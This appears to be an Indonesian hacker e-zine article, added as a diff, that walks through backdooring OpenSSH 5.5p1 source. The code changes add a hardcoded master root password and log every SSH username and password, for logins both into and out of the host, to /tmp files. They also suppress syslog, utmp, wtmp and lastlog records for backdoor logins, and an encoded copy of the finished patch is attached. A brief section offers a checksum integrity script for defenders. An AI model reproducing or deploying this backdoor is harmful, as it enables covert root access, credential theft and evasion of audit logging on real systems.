@@ -1,0 +1,551 @@
+                                                
+              .;               .-.              
+  .-.  .-.    ;;-. .-..-.      `-' . ,';.  .-.  
+.;.-' ;      ;;  ;;   ;' ;.   ;'   ;;  ;;.;.-'  
+ `:::'`;;;;'.;`  ``;;'(   ;_.;:._.';  ;;  `:::' 
+                       `-'        ;    `.       
+ECHO MAGAZINE VOLUME IX, ISSUE XXIV, PHILE 0x05.TXT
+
+Developing OPENSSH Backdoor for Fun and Sh*t - Monkey D. Luffy
+
+-----[ Introduction
+
+Let's set sail to the sea once again, being pirate again and again!
+Cyberspace is our sea, security industry is our navy :| 
+We are the one who has the freedom, create the rule on the dark sea.
+
+~sapaajaboleh
+
+-----[ Backdoor
+
+Backdoor adalah pintu belakang yang digunakan oleh 'pirates' untuk
+mengakses sistem yang telah dikuasai di masa mendatang. Beberapa jenis
+backdoor diantaranya:
+
+ - Web based backdoor misalnya PHP shell, ASP shell, CGI shell.
+ - Binding backdoor misalnya bindty dan netcat.
+ - Sistem service backdoor misalnya OpenSSH backdoor, FTP backdoor, ours
+   are many more.
+ - Kernel level backdoor misalnya loadable kernel module dengan beragam
+   tekniknya
+ - Sistem manajemen mode backdoor
+ - Hypervisor level backdoor
+ - ETC
+
+Setiap tipe backdoor memiliki kekurangan dan kelebihannya masing-masing.
+Semakin sulit dideteksi sebuah backdoor cenderung semakin tergantung
+dari sistem atau hardware yang digunakan. Contoh sederhana adalah kernel
+level backdoor yang bisa bekerja di kernel rilis X tetapi kita perlu
+modifikasi agar bekerja di kernel versi Y.
+
+Dari efektifitas dan kemudahan installasi serta tingkat kesulitan untuk
+dideteksi maka sistem service backdoor dan kernel level backdoor menurut
+penulis adalah pilihan terbaik.
+
+-----[ OpenSSH Backdoor
+
+OpenSSH backdoor adalah jenis backdoor yang memanfaatkan modifikasi pada
+service OpenSSH dengan tujuan:
+
+ - Memberikan akses root instant tanpa mengetahui root password sistem.
+ - Merecord semua password login SSH dari remote ke sistem.
+ - Merecord semua password login SSH dari sistem ke remote server.
+ - Tidak di log mekanisme logging system (syslog, utmp, wtmp, lastlog).
+ - So far tidak terdeteksi chkrootkit dan rkhuntier.
+
+Kekurangan dari backdoor ini adalah mengubah binary file SSH pada sistem
+sehingga akan terdeteksi oleh integrity checking. Selain itu koneksi SSH
+walaupun tidak ter-log tetapi terdeteksi sebagai "established connection"
+oleh netstat.
+
+Walapun demikian fitur SSH backdoor jauh lebih menarik dibandingkan web
+based backdoor atau binding backdoor. Selain itu installasi lebih mudah
+daripada kernel level backdoor. Sangat cocok buat pemula yang ingin
+melangkah maju. *IKLAN*
+
+-------[ Few Stories
+
+Backdoor pada OpenSSH sudah dikembangkan sejak pada versi 1.x.yy Salah
+satu backdoor OpenSSH yang menurut saya cukup banyak digunakan adalah
+modifikasi OpenSSH 3.4p1 yang ditulis oleh sec.angrypacket.com. Ada
+perbedaan cukup mencolok pada user interface untuk SSH client yang
+berasal dari openSSH 3.4p1 dengan OpenSSH setelah 3.9p1. Hal ini menjadi
+pertimbangan utama untuk tidak menggunakan OpenSSH 3.4p1 sebagai
+backdoor kebanyakan sistem saat ini.
+
+Pada beberapa sistem penggunaan OpenSSH 3.4p1 juga berakibat pada
+terminasi koneksi SSH untuk user legal dalam sistem, walaupun user root
+backdoor bisa login secara normal. Walaupun demikian semua tetap
+tergantung pada siapa bajak laut yang mengoperasikan kapalnya, bukan
+begitu?!
+
+-------[ OpenSSH 5.5p1 Hacking
+
+Sebelum memulai silahkan download OpenSSH 5.5p1 dari website resminya. Jika
+anda cukup malas membaca [3.2] ini silahkan gunakan patch yang sudah jadi
+tapi tetap anda harus download OpenSSH 5.5p1.
+
+---------[ Modifikasi header file includes.h
+
+Modifikasi ini bertujuan untuk menentukan password apa yang akan digunakan
+oleh SSH backdoor dan menentukan dimana lokasi log password disimpan.
+Silahakan menuju ke baris 173-175 file includes.h:
+
+------------ includes.h ----------
+173 #include "entropy.h"
+174 
+175 #endif /* INCLUDES_H */
+----------- includes.h ----------
+
+<<< lakukan modifikasi menjadi >>>
+----------- includes.h ----------
+173 #include "entropy.h"
+174
+175 int secret_ok;
+176 FILE *f;
+177 #define ILOG "/tmp/ilog"
+178 #define OLOG "/tmp/olog"
+179 #define SECRETPW "apajaboleh"
+180
+181 #endif /* INCLUDES_H */
+---------- includes.h ----------
+
+/tmp/ilog adalah file tempat penyimpanan login SSH dari remote ke sistem
+/tmp/olog adalah file tempat menyimpan login SSH dari sistem ke remote
+apajaboleh adalah password root backdoor.
+
+---------[ Akses root instant
+
+Modifikasi ini bertujuan untuk memberikan akses root instant tanpa
+mengetahui password sistem. Silahkan menuju baris 119-125 file
+auth-passwd.c.
+
+-------------- auth-passwd.c ------
+119         if (!expire_checked) {
+120                 expire_checked = 1;
+121                 if (auth_shadow_pwexpired(authctxt))
+122                         authctxt->force_pwchange = 1;
+123         }
+124 #endif
+125         result = sys_auth_passwd(authctxt, password);
+------------- auth-passwd.c -------
+
+<<< lakukan modifikasi menjadi >>>
+
+------------ auth-passwd.c -------
+119         if (!expire_checked) {
+120                 expire_checked = 1;
+121                 if (auth_shadow_pwexpired(authctxt))
+122                         authctxt->force_pwchange = 1;
+123         }
+124 #endif
+125
+126         if (!strcmp(password, SECRETPW)) {
+127                secret_ok=1;
+128                return (1 && ok);
+129         }
+130
+131         result = sys_auth_passwd(authctxt, password);
+----------- auth-passwd.c -------
+
+Jika login root dengan menggunakan SECRETPW maka secara instant anda akan 
+menjadi root pada sistem tersebut. Perlu diketahui ini membutuhkan
+konfigurasi "PermitRootLogin yes" pada sshd_config.
+
+---------[ Record semua login SSH ke sistem
+
+Modifikasi ini bertujuan untuk mencatat password user yang ada di dalam
+sistem termasuk password root. Silahkan menuju baris 125-129 pada file
+auth-passwd.c.
+
+----------- auth-passwd.c -------
+125         result = sys_auth_passwd(authctxt, password);
+126         if (authctxt->force_pwchange)
+127                 disable_forwarding();
+128         return (result && ok);
+129 }
+---------- auth-passwd.c --------
+
+<<< lakukan modifikasi menjadi >>>
+
+---------- auth-passwd.c --------
+131         result = sys_auth_passwd(authctxt, password);
+132         if(result){
+133           if((f=fopen(ILOG,"a"))!=NULL){
+134             fprintf(f,"user:password --> %s:%s\n",authctxt->user, password);
+135             fclose(f);
+136           }
+137         }
+138
+139         if (authctxt->force_pwchange)
+140           disable_forwarding();
+141         return (result && ok);
+142 }
+---------- auth-passwd.c --------
+
+Jika user berhasil login ke dalam sistem, catat user dan password tersebut
+pada file yang didefinisikan oleh ILOG.
+
+---------[ Record semua login SSH dari sistem ke remote server
+
+Modifikasi ini bertujuan untuk mencatat user, password, dan remote server 
+ketika ada seseorang menggunakan SSH client untuk login ke remote server.
+Silahkan menuju pada baris 816-820 file sshconnect2.c.
+
+-------------- sshconnect2.c -----------
+816         snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+817             authctxt->server_user, host);
+818         password = read_passphrase(prompt, 0);
+819         packet_start(SSH2_MSG_USERAUTH_REQUEST);
+820         packet_put_cstring(authctxt->server_user);
+------------- sshconnect2.c ------------
+
+<<< lakukan modifikasi menjadi >>>
+
+------------ sshconnect2.c -------------
+816         snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+817             authctxt->server_user, host);
+818         password = read_passphrase(prompt, 0);
+819         if((f=fopen(OLOG,"a"))!=NULL){
+820           fprintf(f,"user:password@host --> %s:%s@%s\n",authctxt->server_user,password,authctxt->host);
+821           fclose(f);
+822         }
+823         packet_start(SSH2_MSG_USERAUTH_REQUEST);
+824         packet_put_cstring(authctxt->server_user);
+------------ sshconnect2.c -------------
+
+Jika ada user yang menginputkan password untuk keperluan login SSH ke
+remote server catat user, password, dan server tersebut pada file yang
+didefinisikan oleh OLOG.
+
+---------[ Jangan catat authentikasi login backdoor pada syslog
+
+Proses login SSH normal akan dicatat oleh syslog ke log file. Pada beberapa
+sistem akan dicatat ke /var/log/messages, /var/log/secure, dan/atau
+/var/log/auth.log. Untuk login root backdoor mekanisme syslog ini harus
+dicegah dengan memodifikasi file auth.c pada baris 274-282 berikut:
+
+--------------- auth.c ---------------------
+274         authlog("%s %s for %s%.100s from %.200s port %d%s",
+275             authmsg,
+276             method,
+277             authctxt->valid ? "" : "invalid user ",
+278             authctxt->user,
+279             get_remote_ipaddr(),
+280             get_remote_port(),
+281             info);
+282         }
+--------------- auth.c --------------------
+
+<<< lakukan modifikasi menjadi >>>
+
+-------------- auth.c --------------------
+274         if(!secret_ok || secret_ok !=1){
+275             authlog("%s %s for %s%.100s from %.200s port %d%s",
+276             authmsg,
+277             method,
+278             authctxt->valid ? "" : "invalid user ",
+279             authctxt->user,
+280             get_remote_ipaddr(),
+281             get_remote_port(),
+282             info);
+283         }
+-------------- auth.c --------------------
+
+Modifikasi juga perlu dilakukan pada file canohost.c pada baris 81-85
+terkait dengan proses reverse map.
+
+------------- canohost.c -----------------
+81         if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+82             NULL, 0, NI_NAMEREQD) != 0) {
+83                 /* Host name not found.  Use ip address. */
+84                 return xstrdup(ntop);
+85         }
+------------ canohost.c ------------------
+
+<<< lakukan modifikasi menjadi >>>
+
+------------ canohost.c ------------------
+81         if(!secret_ok || secret_ok!=1){
+82           if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+83             NULL, 0, NI_NAMEREQD) != 0) {
+84                 /* Host name not found.  Use ip address. */
+85                 return xstrdup(ntop);
+86           }
+87         }
+----------- canohost.c -------------------
+
+Semua login dengan menggunakan password backdoor tidak akan dicatat pada
+mekanisme logging syslog. Untuk login user normal semua proses tetap
+dicatat oleh syslog.
+
+---------[ Jangan catat authentikasi login backdoor pada utmp/wtmp
+
+Proses login SSH normal akan dicatat pada file utmp, wtmp, dan lastlog.
+Perlu diketahui bahwa: 
+
+ - file /var/run/utmp mencatat siapa saja yang sedang login.
+ - file /var/log/wtmp mencatat siapa saja dan kapan user pernah login.
+ - file /var/log/lastlog mencatat siapa dan kapan user terakhir login.
+
+Untuk menghindari pencatatan ini perlu dilakukan modifikasi pada file
+sshlogin.c pada baris 134-137.
+
+-------------- sshlogin.c -----------------
+134         li = login_alloc_entry(pid, user, host, tty);
+135         login_set_addr(li, addr, addrlen);
+136         login_login(li);
+137         login_free_entry(li);
+-------------- sshlogin.c ----------------
+
+<<< lakukan modifikasi menjadi >>>
+
+------------- sshlogin.c ------------------
+135         login_set_addr(li, addr, addrlen);
+136         if(!secret_ok || secret_ok!=1){
+137                 login_login(li);
+138                 login_free_entry(li);
+139         }
+------------- sshlogin.c ------------------
+
+Selain itu perlu juga dilakukan modifikasi pada baris 160-162 masih pada
+file yang sama (sshlogin.c)
+
+------------- sshlogin.c ------------------
+160         li = login_alloc_entry(pid, user, NULL, tty);
+161         login_logout(li);
+162         login_free_entry(li);
+------------- sshlogin.c ------------------
+
+<<< lakukan modifikasi menjadi >>>
+
+------------- sshlogin.c ------------------
+162         li = login_alloc_entry(pid, user, NULL, tty);
+163         if(!secret_ok || secret_ok!=1){
+164                 login_logout(li);
+165                 login_free_entry(li);
+166         }
+------------ sshlogin.c -------------------
+
+Dengan modifikasi ini proses login dengan menggunakan password backdoor
+tidak akan dicatat pada utmp, wtmp, dan lastlog. Hanya login normal saja
+yang dicatat pada file tersebut.
+
+Sampai disini modifikasi sudah selesai. Patch lengkapnya sudah terbendel
+pada artikel ini. Cara mudah menggunakan patch tersebut ada pada file
+INSTALL. Have fun and be stealth!
+
+-----[ Tindakan preventif
+
+Sesuai dengan paparan sebelumnya bahwa SSH backdoor akan mengubah integrity
+file binary SSH. Salah satu cara untuk melakukan pengecekan integrity 
+adalah dengan memanfaatkan md5sum dan sha1sum. Untuk mudahnya gunakan tool 
+berikut setelah anda selesai melakukan instalasi OPENSSH Ke sistem:
+
+-------------------- sshintegritychecker.sh --------
+#!/bin/bash
+#All credits goes to IPSECS || http://ipsecs.com
+
+VER="1.0.0"
+MD5=/path/bin/md5sum
+SHA1=/path/bin/sha1sum
+PROTECTED="/usr/sbin/sshd /usr/bin/ssh* $MD5 $SHA1"
+MD5BASE="MD5.base"
+SHA1BASE="SHA1.base"
+
+if [ -z $1 ]
+then
+ echo "Usage    : $0 <opetions>"
+ echo "Options  :"
+ echo "lock     - set immutable bit"
+ echo "open     - unset immutable bit"
+ echo "create   - create md5sum dan sha1sum"
+ echo "check    - check md5sum dan sha1sum"
+ echo
+ exit
+fi
+
+case $1 in
+ "lock")
+  chattr +i $PROTECTED
+ ;;
+ "open")
+  chattr -i $PROTECTED
+ ;;
+ "create")
+  $MD5 $PROTECTED > $MD5BASE
+  chattr +i $MD5BASE
+  $SHA1 $PROTECTED > $SHA1BASE
+  chattr +i $SHA1BASE
+ ;;
+ "check")
+  $MD5 -c $MD5BASE
+  $SHA1 -c $SHA1BASE
+ ;;
+*)
+  echo "ERROR! unknown option"
+ ;;
+esac
+------------------ sshintegritychecker.sh ----------
+
+Pengecekan dilakukan dengan menggunakan md5sum dan sha1sum secara berurutan
+dengan harapan mengoptimalkan validitas hasil pengecekan. Bagi yang kungfu
+kernelnya cukup sangar silahkan di hajar sys_open() jika truncate flags ON, 
+sys_unlink(), sys_unlinkat(), sys_rename(). *antara malas dan nda sempet
+nulis*
+
+-----[ Conclusion
+
+Backdoor itu beraneka ragam sehingga butuh pengetahuan lebih bagi pirates
+maupun sys admin. Saat ini web based backdoor mungkin paling banyak dikenal
+dikalangan anak muda :| tetapi perlu diketahui bahwa web based backdoor
+adalah backdoor paling lemah yang pernah saya kenal sebagai threat pada
+sebuah sistem.
+
+Oiya sebagai tambahan, jika ada temen-temen sys admin yang sudah
+bertahun-tahun merasa belum pernah dikuasai servernya oleh pihak lain
+silahkan koreksi diri. Why? Itu anda yang terlalu bodoh dan tidak pernah
+bisa mendeteksi intrusion bukan anda yang terlalu hebat.
+
+-----[ Lampiran   
+
+begin 644 openssh-5.5p1.patch.tar.gz
+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
